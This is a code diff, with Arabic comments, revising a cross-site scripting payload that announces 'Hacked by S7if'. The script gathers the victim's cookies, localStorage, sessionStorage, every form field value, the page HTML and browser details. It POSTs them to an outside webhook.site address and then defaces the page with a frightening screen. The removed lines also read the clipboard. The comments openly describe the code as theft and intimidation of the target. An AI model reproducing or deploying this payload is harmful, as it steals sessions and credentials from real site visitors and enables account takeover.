@@ -1,61 +1,53 @@
 <script>
 (async () => {
+  // نغلف كل حاجة بـ try/catch شامل
   try {
-    // 👑 Alert ترهيب مبدئي
     alert("💀 Hacked by S7if 💀");
 
-    // 🧠 تجميع البيانات
-    const stealData = async () => {
-      const result = {
-        cookies: document.cookie,
-        url: location.href,
-        referrer: document.referrer,
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        time: new Date().toISOString(),
-        clipboard: "",
-        localStorage: {},
-        sessionStorage: {},
-        forms: [],
-        html: document.documentElement.outerHTML.slice(0, 3000)
-      };
-
-      try {
-        result.localStorage = { ...localStorage };
-      } catch { result.localStorage = "Access denied"; }
-
-      try {
-        result.sessionStorage = { ...sessionStorage };
-      } catch { result.sessionStorage = "Access denied"; }
-
-      try {
-        result.forms = Array.from(document.forms).map(f => ({
-          action: f.action,
-          method: f.method,
-          fields: Array.from(f.elements).map(e => ({
-            name: e.name,
-            type: e.type,
-            value: e.value
-          }))
-        }));
-      } catch { result.forms = "Could not extract forms"; }
-
-      try {
-        result.clipboard = await navigator.clipboard.readText();
-      } catch { result.clipboard = "Clipboard access denied"; }
-
-      return result;
+    const data = {
+      cookies: document.cookie,
+      url: location.href,
+      referrer: document.referrer,
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      time: new Date().toISOString(),
+      clipboard: "Not accessed", // مؤقتًا، علشان ميتعطلش
+      localStorage: {},
+      sessionStorage: {},
+      forms: [],
+      html: document.documentElement.outerHTML.slice(0, 3000)
     };
 
-    // 🚀 إرسال البيانات
-    const payload = await stealData();
+    // نجرب ناخد local/session
+    try {
+      data.localStorage = { ...localStorage };
+    } catch {}
+
+    try {
+      data.sessionStorage = { ...sessionStorage };
+    } catch {}
+
+    // نجرب ناخد الفورمز
+    try {
+      data.forms = Array.from(document.forms).map(f => ({
+        action: f.action,
+        method: f.method,
+        fields: Array.from(f.elements).map(e => ({
+          name: e.name,
+          type: e.type,
+          value: e.value
+        }))
+      }));
+    } catch {}
+
+    // نبعت الداتا
     await fetch("https://webhook.site/323bd404-2b33-4438-93b4-81f85ccc77cb", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload)
+      body: JSON.stringify(data)
     });
 
-    // 👻 صفحة مرعبة بعد السرقة
+    // نخوف الهدف بشاشة مزيفة بعد السرقة
     document.body.innerHTML = `
       <div style="display:flex;flex-direction:column;justify-content:center;align-items:center;height:100vh;background:#000;color:#0f0;font-size:2em;font-family:monospace;text-align:center;">
         <div style="font-size: 0.9em; color: #f00;">👑 Saif 👑</div>
